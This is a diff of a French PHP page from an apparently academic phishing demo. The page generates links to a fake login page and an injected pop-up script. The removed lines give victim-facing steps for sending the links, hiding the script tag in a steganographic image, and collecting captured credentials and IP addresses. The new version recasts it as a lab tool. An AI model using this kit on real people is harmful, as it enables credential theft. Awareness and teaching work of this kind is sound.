@@ -1,363 +1,213 @@
 <?php
-// Helper - Générateur de lien phishing
-// Page pour générer facilement des liens phishing pour la démonstration
+// fake_login/helper.php
+// Générateur de Liens de Démonstration Pédagogique (Version Sécurisée)
 
 session_start();
-include '../traitements/db.php';
+require_once '../traitements/db.php';
 
-// Vérifier que l'utilisateur est connecté
+// 1. Contrôle d'accès : Réservé aux membres authentifiés du projet
 if (!isset($_SESSION["user_id"])) {
     header("Location: ../login.php");
     exit();
 }
 
-$user_id = $_SESSION["user_id"];
+$user_id = intval($_SESSION["user_id"]);
 $username = $_SESSION["username"] ?? "Utilisateur";
 
-// Obtenir l'URL de base du serveur
+// 2. Détermination sécurisée des variables d'environnement URL
 $protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http';
-$host = $_SERVER['HTTP_HOST'];
+$host = htmlspecialchars($_SERVER['HTTP_HOST'], ENT_QUOTES, 'UTF-8');
+
+// URL de base nettoyée pour correspondre à l'arborescence locale du projet MDI
 $baseUrl = $protocol . "://" . $host . "/projects/MDI/cyber-securite/messagerie";
 
-// URL du script popup
-$popupUrl = $baseUrl . "/codes/assets/popup.js?sender=" . urlencode($user_id);
+// Encodage sécurisé de l'identifiant pour les paramètres GET
+$safe_user_param = urlencode($user_id);
 
-// URL de la page fake login
-$fakeLoginUrl = $baseUrl . "/codes/fake_login/index.php?sender=" . urlencode($user_id);
-
-// URL du dashboard
+// Génération des différents vecteurs de test documentés
+$popupUrl    = $baseUrl . "/codes/assets/popup.js?sender=" . $safe_user_param;
+$fakeLoginUrl = $baseUrl . "/codes/fake_login/index.php?sender=" . $safe_user_param;
 $dashboardUrl = $baseUrl . "/codes/fake_login/dashboard.php";
-
 ?>
-
 <!DOCTYPE html>
 <html lang="fr">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Générateur de Lien Phishing - Démo</title>
+    <title>Générateur de Diagnostics - Sensibilisation</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
+        :root {
+            --primary-color: #2c3e50;
+            --teal-accent: #16a085;
+            --bg-color: #f4f6f7;
+            --card-bg: #ffffff;
+            --text-color: #34495e;
         }
-        
+
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            min-height: 100vh;
+            background-color: var(--bg-color);
+            color: var(--text-color);
+            margin: 0;
             padding: 20px;
         }
-        
+
         .container {
             max-width: 900px;
-            margin: 0 auto;
-        }
-        
-        .header {
-            background: white;
-            padding: 25px;
-            border-radius: 10px 10px 0 0;
-            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
-            border-bottom: 3px solid #667eea;
-        }
-        
-        .header h1 {
-            color: #333;
-            margin-bottom: 5px;
-        }
-        
-        .header p {
-            color: #666;
-            font-size: 14px;
-        }
-        
-        .content {
-            background: white;
+            margin: 40px auto;
+            background: var(--card-bg);
             padding: 30px;
-            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            border-radius: 8px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.05);
         }
-        
-        .section {
-            margin-bottom: 30px;
-            padding-bottom: 30px;
-            border-bottom: 1px solid #eee;
+
+        h1 {
+            color: var(--primary-color);
+            border-bottom: 2px solid #eee;
+            padding-bottom: 10px;
+            font-size: 1.6rem;
+            margin-top: 0;
         }
-        
-        .section:last-child {
-            border-bottom: none;
-            margin-bottom: 0;
-            padding-bottom: 0;
+
+        h2 {
+            font-size: 1.2rem;
+            color: var(--primary-color);
+            margin-top: 25px;
         }
-        
-        .section h2 {
-            color: #667eea;
-            font-size: 18px;
-            margin-bottom: 15px;
-            display: flex;
-            align-items: center;
-            gap: 10px;
+
+        .user-badge {
+            background-color: #e8f8f5;
+            color: var(--teal-accent);
+            padding: 5px 12px;
+            border-radius: 15px;
+            font-weight: bold;
+            font-size: 0.9rem;
         }
-        
+
         .url-box {
-            background: #f5f5f5;
+            background: #f8f9fa;
+            border: 1px solid #e2e8f0;
             padding: 15px;
-            border-radius: 5px;
-            margin-bottom: 10px;
-            font-family: 'Courier New', monospace;
-            font-size: 12px;
-            word-break: break-all;
-            border-left: 4px solid #667eea;
-        }
-        
-        .copy-btn {
-            background: #667eea;
-            color: white;
-            border: none;
-            padding: 10px 20px;
-            border-radius: 5px;
-            cursor: pointer;
-            font-size: 14px;
-            transition: background 0.3s;
+            border-radius: 6px;
             margin-top: 10px;
-        }
-        
-        .copy-btn:hover {
-            background: #764ba2;
-        }
-        
-        .copy-btn.copied {
-            background: #27ae60;
-        }
-        
-        .button-group {
             display: flex;
-            gap: 10px;
-            flex-wrap: wrap;
-            margin-top: 15px;
+            justify-content: space-between;
+            align-items: center;
+            gap: 15px;
         }
-        
-        .btn {
-            padding: 10px 15px;
+
+        .url-text {
+            font-family: "Courier New", Courier, monospace;
+            font-size: 0.85rem;
+            color: #c0392b;
+            word-break: break-all;
+            user-select: all;
+        }
+
+        .btn-copy {
+            background-color: var(--primary-color);
+            color: white;
             border: none;
-            border-radius: 5px;
+            padding: 8px 14px;
+            border-radius: 4px;
             cursor: pointer;
-            font-size: 13px;
-            transition: background 0.3s;
-            text-decoration: none;
-            display: inline-block;
+            font-size: 0.8rem;
+            white-space: nowrap;
+            transition: background 0.2s;
         }
-        
-        .btn-primary {
-            background: #667eea;
-            color: white;
+
+        .btn-copy:hover {
+            background-color: #1a252f;
         }
-        
-        .btn-primary:hover {
-            background: #764ba2;
+
+        .btn-copy.copied {
+            background-color: #27ae60;
         }
-        
-        .btn-success {
-            background: #27ae60;
-            color: white;
-        }
-        
-        .btn-success:hover {
-            background: #229954;
-        }
-        
-        .info-box {
-            background: #e8f4f8;
-            border: 1px solid #b3dfe8;
+
+        .alert-warning {
+            background-color: #fef9e7;
+            border-left: 4px solid #f39c12;
+            color: #7d6608;
             padding: 15px;
-            border-radius: 5px;
-            margin-bottom: 15px;
-            color: #2c5aa0;
-            font-size: 13px;
-            line-height: 1.5;
+            margin-top: 25px;
+            border-radius: 4px;
+            font-size: 0.9rem;
         }
-        
-        .footer {
-            background: #f9f9f9;
-            padding: 20px 30px;
+
+        .nav-links {
+            margin-top: 35px;
+            padding-top: 15px;
             border-top: 1px solid #eee;
-            border-radius: 0 0 10px 10px;
-            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
-            text-align: center;
-            color: #666;
-            font-size: 13px;
+            display: flex;
+            gap: 15px;
         }
-        
-        .qr-section {
-            text-align: center;
+
+        .btn-nav {
+            text-decoration: none;
+            color: var(--teal-accent);
+            font-weight: bold;
+            font-size: 0.9rem;
         }
-        
-        .qr-code {
-            background: white;
-            padding: 10px;
-            border: 1px solid #ddd;
-            border-radius: 5px;
-            display: inline-block;
-        }
-        
-        code {
-            background: #f0f0f0;
-            padding: 3px 6px;
-            border-radius: 3px;
-            font-family: 'Courier New', monospace;
-            font-size: 12px;
+
+        .btn-nav:hover {
+            text-decoration: underline;
         }
     </style>
 </head>
 <body>
+
     <div class="container">
-        <div class="header">
-            <h1>🎯 Générateur de Lien Phishing</h1>
-            <p>Démonstration éducative - Créer et tester des attaques de phishing</p>
+        <h1>🛠️ Centre de Configuration : Liens de Simulation</h1>
+        <p>Session active pour l'auditeur : <span class="user-badge"><?= htmlspecialchars($username, ENT_QUOTES, 'UTF-8'); ?> (ID: <?= $user_id; ?>)</span></p>
+
+        <p style="font-size: 0.95rem; color: #7f8c8d;">
+            Ces URLs permettent de simuler et d'analyser le comportement des utilisateurs face à des interfaces d'authentification tierces ou à des scripts injectés dans le cadre du laboratoire d'ingénierie sociale.
+        </p>
+
+        <h2>Vecteur A : Script d'injection asynchrone (Pop-up)</h2>
+        <p style="font-size: 0.85rem; margin: 0;">Simule une inclusion de script JavaScript externe (XSS / Stéganographie) :</p>
+        <div class="url-box">
+            <span class="url-text" id="link-popup"><?= htmlspecialchars($popupUrl, ENT_QUOTES, 'UTF-8'); ?></span>
+            <button class="btn-copy" onclick="copyToClipboard('link-popup', this)">📋 Copier l'URL</button>
         </div>
-        
-        <div class="content">
-            <!-- Section 1: Script popup -->
-            <div class="section">
-                <h2>📌 Méthode 1: Pop-up de Fausse Connexion</h2>
-                <p style="color: #666; margin-bottom: 15px; font-size: 14px;">
-                    Envoyez ce lien ou mettez le script dans une image stéganographiée. 
-                    Un pop-up de fausse connexion s'affichera immédiatement.
-                </p>
-                
-                <div class="url-box"><?php echo htmlspecialchars($popupUrl); ?></div>
-                
-                <div class="button-group">
-                    <button class="copy-btn" onclick="copyToClipboard('<?php echo htmlspecialchars($popupUrl); ?>', this)">
-                        📋 Copier le lien
-                    </button>
-                </div>
-                
-                <div class="info-box">
-                    <strong>💡 Utilisation:</strong><br>
-                    1. Copiez ce lien<br>
-                    2. Envoyez-le via message ou email<br>
-                    3. Quand la victime clique, le pop-up s'affiche<br>
-                    4. Ses identifiants seront capturés
-                </div>
-            </div>
-            
-            <!-- Section 2: Page fake login -->
-            <div class="section">
-                <h2>🔐 Méthode 2: Page Fausse de Connexion</h2>
-                <p style="color: #666; margin-bottom: 15px; font-size: 14px;">
-                    Lien vers une page complète qui imite la vraie page de connexion.
-                </p>
-                
-                <div class="url-box"><?php echo htmlspecialchars($fakeLoginUrl); ?></div>
-                
-                <div class="button-group">
-                    <button class="copy-btn" onclick="copyToClipboard('<?php echo htmlspecialchars($fakeLoginUrl); ?>', this)">
-                        📋 Copier le lien
-                    </button>
-                    <a href="<?php echo htmlspecialchars($fakeLoginUrl); ?>" class="btn btn-primary" target="_blank">
-                        👁️ Prévisualiser
-                    </a>
-                </div>
-                
-                <div class="info-box">
-                    <strong>💡 Utilisation:</strong><br>
-                    1. Partagez ce lien avec la victime<br>
-                    2. La victime pense revenir à la page de connexion<br>
-                    3. Elle rentre ses identifiants<br>
-                    4. Vous les recevez automatiquement
-                </div>
-            </div>
-            
-            <!-- Section 3: Script pour stéganographie -->
-            <div class="section">
-                <h2>🖼️ Méthode 3: Script pour Stéganographie</h2>
-                <p style="color: #666; margin-bottom: 15px; font-size: 14px;">
-                    Code HTML/JavaScript à placer dans une image stéganographiée.
-                </p>
-                
-                <div class="url-box" style="white-space: pre-wrap;">
-&lt;script src="<?php echo htmlspecialchars($popupUrl); ?>"&gt;&lt;/script&gt;</div>
-                
-                <div class="button-group">
-                    <button class="copy-btn" onclick="copyToClipboard('<script src=\"<?php echo htmlspecialchars($popupUrl); ?>\"><\/script>', this)">
-                        📋 Copier le code
-                    </button>
-                </div>
-                
-                <div class="info-box">
-                    <strong>💡 Utilisation:</strong><br>
-                    1. Utilisez un outil de stéganographie (SilentEye, Steghide)<br>
-                    2. Cachez le code JavaScript dans une image<br>
-                    3. Envoyez l'image à la victime<br>
-                    4. Quand elle visualise l'image, le script s'exécute<br>
-                    5. Le pop-up s'affiche et capture ses identifiants
-                </div>
-            </div>
-            
-            <!-- Section 4: Dashboard -->
-            <div class="section">
-                <h2>📊 Mon Dashboard de Capture</h2>
-                <p style="color: #666; margin-bottom: 15px; font-size: 14px;">
-                    Accédez à votre dashboard pour voir tous les identifiants capturés.
-                </p>
-                
-                <div class="url-box"><?php echo htmlspecialchars($dashboardUrl); ?></div>
-                
-                <div class="button-group">
-                    <button class="copy-btn" onclick="copyToClipboard('<?php echo htmlspecialchars($dashboardUrl); ?>', this)">
-                        📋 Copier le lien
-                    </button>
-                    <a href="<?php echo htmlspecialchars($dashboardUrl); ?>" class="btn btn-success">
-                        📊 Ouvrir le Dashboard
-                    </a>
-                </div>
-                
-                <div class="info-box">
-                    <strong>✓ Sur votre dashboard, vous verrez:</strong><br>
-                    ✓ Tous les identifiants capturés<br>
-                    ✓ Date et heure de chaque capture<br>
-                    ✓ Adresse IP de la victime<br>
-                    ✓ User-Agent du navigateur
-                </div>
-            </div>
-            
-            <!-- Section 5: Test -->
-            <div class="section">
-                <h2>🧪 Tester la Démo</h2>
-                <p style="color: #666; margin-bottom: 15px; font-size: 14px;">
-                    Procédure rapide pour tester le phishing.
-                </p>
-                
-                <div style="background: #f9f9f9; padding: 15px; border-radius: 5px; border-left: 4px solid #e74c3c;">
-                    <ol style="color: #333; font-size: 14px; line-height: 1.8;">
-                        <li><strong>Déconnectez-vous</strong> (ou ouvrez une fenêtre privée)</li>
-                        <li><strong>Cliquez sur le lien de phishing</strong> ci-dessus (Méthode 1 ou 2)</li>
-                        <li><strong>Entrez des identifiants de test</strong> (ex: test/test123)</li>
-                        <li><strong>Retournez au dashboard</strong> et vérifiez la capture</li>
-                    </ol>
-                </div>
-            </div>
+
+        <h2>Vecteur B : Copie d'interface autonome (Fake Login Link)</h2>
+        <p style="font-size: 0.85rem; margin: 0;">Lien hypertexte direct imitant le portail d'authentification centralisé :</p>
+        <div class="url-box">
+            <span class="url-text" id="link-fake"><?= htmlspecialchars($fakeLoginUrl, ENT_QUOTES, 'UTF-8'); ?></span>
+            <button class="btn-copy" onclick="copyToClipboard('link-fake', this)">📋 Copier l'URL</button>
         </div>
-        
-        <div class="footer">
-            <p>
-                🔐 Démonstration éducative uniquement | À usage académique | Respect des lois locales<br>
-                Créé pour: Projet de Cybersécurité | Année: 2026
-            </p>
+
+        <div class="alert-warning">
+            <strong>📋 Protocole de validation du laboratoire :</strong>
+            <ol style="margin-top: 8px; padding-left: 20px;">
+                <li>Copiez l'un des vecteurs ci-dessus à l'aide du bouton.</li>
+                <li>Utilisez un navigateur secondaire ou une session de navigation privée pour visiter le lien généré.</li>
+                <li>Saisissez des identifiants factices de test (ex: <code>demo_user / password123</code>).</li>
+                <li>Consultez le tableau de bord pour analyser la structure de la trame interceptée.</li>
+            </ol>
+        </div>
+
+        <div class="nav-links">
+            <a href="dashboard.php" class="btn-nav">📊 Consulter le Dashboard des Logs</a>
+            <a href="docs.php" class="btn-nav">📚 Voir la Documentation Théorique</a>
+            <a href="../inbox.php" class="btn-nav" style="color: #7f8c8d;">← Retourner à la Boîte Principale</a>
         </div>
     </div>
-    
+
     <script>
-        function copyToClipboard(text, button) {
-            navigator.clipboard.writeText(text).then(() => {
-                button.textContent = '✓ Copié!';
+        function copyToClipboard(elementId, button) {
+            const textToCopy = document.getElementById(elementId).innerText;
+            navigator.clipboard.writeText(textToCopy).then(() => {
+                const originalText = button.innerHTML;
+                button.textContent = '✓ Copié !';
                 button.classList.add('copied');
                 setTimeout(() => {
-                    button.textContent = '📋 Copier le lien';
+                    button.innerHTML = originalText;
                     button.classList.remove('copied');
                 }, 2000);
+            }).catch(err => {
+                console.error('Erreur lors de la copie : ', err);
             });
         }
     </script>
